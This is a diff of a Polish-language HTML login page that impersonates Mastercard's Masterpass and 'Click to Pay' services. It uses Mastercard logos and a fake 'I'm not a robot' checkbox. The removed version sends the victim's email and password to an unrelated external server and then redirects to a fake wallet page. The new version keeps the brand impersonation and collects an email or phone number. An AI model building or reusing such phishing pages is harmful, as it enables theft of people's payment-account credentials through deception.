@@ -3,187 +3,135 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Masterpass Login</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  <title>Click to Pay</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
-    .input-icon {
-      position: absolute;
-      left: 0.75rem;
-      top: 50%;
-      transform: translateY(-50%);
-      pointer-events: none;
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #1d1d1d;
+      color: white;
     }
-    .input-with-icon {
-      padding-left: 2.5rem;
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
     }
-    .shake {
-      animation: shake 0.3s ease-in-out;
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 700;
+      color: #f46c24;
+      font-size: 1rem;
+      text-transform: uppercase;
     }
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      20%, 60% { transform: translateX(-5px); }
-      40%, 80% { transform: translateX(5px); }
+    .title {
+      margin-top: 1rem;
+      font-size: 1.25rem;
+      font-weight: 500;
+      text-align: center;
+    }
+    .subtitle {
+      margin-top: 0.25rem;
+      font-size: 0.9rem;
+      color: #b3b3b3;
+      text-align: center;
+    }
+    form {
+      margin-top: 2rem;
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    input {
+      padding: 1rem;
+      border-radius: 6px;
+      border: 1px solid #444;
+      background: #2a2a2a;
+      color: white;
+      font-size: 1rem;
+      outline: none;
+      transition: border 0.3s, box-shadow 0.3s;
+    }
+    input:focus {
+      border-color: #f46c24;
+      box-shadow: 0 0 0 2px rgba(244, 108, 36, 0.5);
+    }
+    .error {
+      border-color: #ff4d4d !important;
+    }
+    .button {
+      background: #555;
+      padding: 1rem;
+      border-radius: 20px;
+      color: white;
+      font-weight: bold;
+      border: none;
+      cursor: not-allowed;
+      transition: background 0.3s;
+    }
+    .button.active {
+      background: #f46c24;
+      cursor: pointer;
+    }
+    footer {
+      margin-top: auto;
+      padding: 1rem;
+      font-size: 0.75rem;
+      text-align: center;
+      color: #777;
     }
   </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans">
-  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-md relative overflow-hidden animate-fade-in">
-    <!-- Header -->
-    <div class="flex items-center justify-between p-4 border-b bg-white">
-      <div class="flex items-center space-x-2">
-        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
-        <div class="text-sm font-semibold">
-          masterpass <span class="text-gray-500 text-xs block">by mastercard.</span>
-        </div>
-      </div>
-      <button class="text-black text-2xl font-bold hover:scale-110 transition">&times;</button>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://img.icons8.com/color/24/000000/mastercard-logo.png" alt="mc" />
+      Click to Pay
     </div>
+    <div class="title">Szybki, bezpieczny sposób płatności online</div>
+    <div class="subtitle">Zaloguj się, aby kontynuować</div>
 
-    <!-- Main content -->
-    <div class="flex bg-white">
-      <!-- Benefits -->
-      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
-        <div>
-          <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
-          <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
-        </div>
-        <div>
-          <img src="https://img.icons8.com/ios-filled/24/ef4444/stopwatch.png" />
-          <p class="mt-2"><strong>Szybkość transakcji</strong><br />Dane karty podajesz tylko raz – przy rejestracji</p>
-        </div>
-        <div>
-          <img src="https://img.icons8.com/ios-filled/24/ef4444/laptop.png" />
-          <p class="mt-2"><strong>Wygoda</strong><br />Zakupy on-line na każdym urządzeniu</p>
-        </div>
-      </div>
+    <form id="loginForm">
+      <input
+        id="loginInput"
+        type="text"
+        placeholder="Adres e-mail lub numer telefonu komórkowego"
+        autocomplete="email"
+        required
+      />
+      <button type="submit" id="submitBtn" class="button">POTWIERDŹ</button>
+    </form>
 
-      <!-- Login form -->
-      <div class="flex-1 p-6">
-        <h2 class="text-lg font-semibold mb-4">Zaloguj się</h2>
-        <form id="loginForm" class="space-y-4">
-          <!-- Email / Phone -->
-          <div class="relative">
-            <svg class="input-icon w-5 h-5 text-gray-400" fill="none" stroke="currentColor" stroke-width="2"
-              viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round"
-                d="M16 12H8m0 0l4-4m-4 4l4 4"></path></svg>
-            <input
-              type="text"
-              name="email"
-              placeholder="Adres e-mail lub numer telefonu"
-              class="input-with-icon w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-              id="emailInput"
-              required />
-          </div>
-          <!-- Password -->
-          <div class="relative">
-            <svg class="input-icon w-5 h-5 text-gray-400" fill="none" stroke="currentColor" stroke-width="2"
-              viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round"
-                d="M12 15v2m-6 4h12a2 2 0 002-2v-5a2 2 0 00-2-2H6a2 2 0 00-2 2v5a2 2 0 002 2zm6-14a2 2 0 11-4 0 2 2 0 014 0z" /></svg>
-            <input
-              type="password"
-              name="password"
-              placeholder="Hasło"
-              class="input-with-icon w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
-              id="passwordInput"
-              required />
-          </div>
-
-          <!-- I'm not a robot -->
-          <div class="flex items-center gap-2">
-            <input type="checkbox" id="robot" />
-            <label for="robot" class="text-sm">I'm not a robot</label>
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="h-6 ml-2" />
-          </div>
-
-          <div class="flex items-center justify-between text-sm">
-            <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
-            <a href="#" class="text-black underline hover:text-orange-500">Nie znam hasła</a>
-          </div>
-
-          <button
-            type="submit"
-            class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
-            id="loginBtn"
-            disabled>
-            Zaloguj
-          </button>
-        </form>
-      </div>
-    </div>
-
-    <!-- Footer -->
-    <div class="text-xs bg-black text-white p-2 text-center">
-      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę...
-    </div>
-    <div class="bg-white text-xs p-2 flex justify-between items-center border-t">
-      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5" />
-      <span>Zgoda na pliki cookies</span>
-    </div>
+    <footer>
+      Pomoc &nbsp;|&nbsp; Warunki &nbsp;|&nbsp; Polityka prywatności
+    </footer>
   </div>
 
   <script>
+    const input = document.getElementById('loginInput');
+    const button = document.getElementById('submitBtn');
     const form = document.getElementById('loginForm');
-    const loginBtn = document.getElementById('loginBtn');
-    const robotCheckbox = document.getElementById('robot');
-    const emailInput = document.getElementById('emailInput');
-    const passwordInput = document.getElementById('passwordInput');
 
-    // Enable button on checkbox
-    robotCheckbox.addEventListener('change', () => {
-      loginBtn.disabled = !robotCheckbox.checked;
-      loginBtn.classList.toggle('bg-orange-500', robotCheckbox.checked);
-      loginBtn.classList.toggle('cursor-pointer', robotCheckbox.checked);
-      loginBtn.classList.toggle('cursor-not-allowed', !robotCheckbox.checked);
+    const validRegex = /^(\+48\d{9}|[\w.-]+@[\w.-]+\.[a-zA-Z]{2,})$/;
+
+    input.addEventListener('input', () => {
+      const isValid = validRegex.test(input.value);
+      input.classList.toggle('error', !isValid && input.value !== '');
+      button.classList.toggle('active', isValid);
+      button.disabled = !isValid;
     });
 
-    // Validation logic
-    function isValidEmailOrPhone(value) {
-      const emailRegex = /^[\\w.-]+@[\\w.-]+\\.\\w{2,}$/;
-      const phoneRegex = /^\\+48\\d{9}$/;
-      return emailRegex.test(value) || phoneRegex.test(value);
-    }
-
-    form.addEventListener('submit', async (e) => {
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
-      const email = emailInput.value.trim();
-      const password = passwordInput.value.trim();
-
-      if (!isValidEmailOrPhone(email)) {
-        emailInput.classList.add('border-red-500', 'shake');
-        setTimeout(() => emailInput.classList.remove('shake'), 300);
-        return;
-      }
-
-      if (password.length < 8) {
-        passwordInput.classList.add('border-red-500', 'shake');
-        setTimeout(() => passwordInput.classList.remove('shake'), 300);
-        return;
-      }
-
-      const payload = {
-        email: email,
-        password: password,
-        remember: document.getElementById('remember').checked
-      };
-
-      try {
-        const res = await fetch('https://zaza-back.onrender.com/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload),
-        });
-
-        if (res.ok) {
-          localStorage.setItem('user', JSON.stringify({
-            email: email,
-            balance: '100.00'
-          }));
-          window.location.href = 'wallet.html';
-        }
-      } catch (err) {
-        console.error(err);
-      }
+      if (!validRegex.test(input.value)) return;
+      alert('Dalszy proces logowania...');
     });
   </script>
 </body>
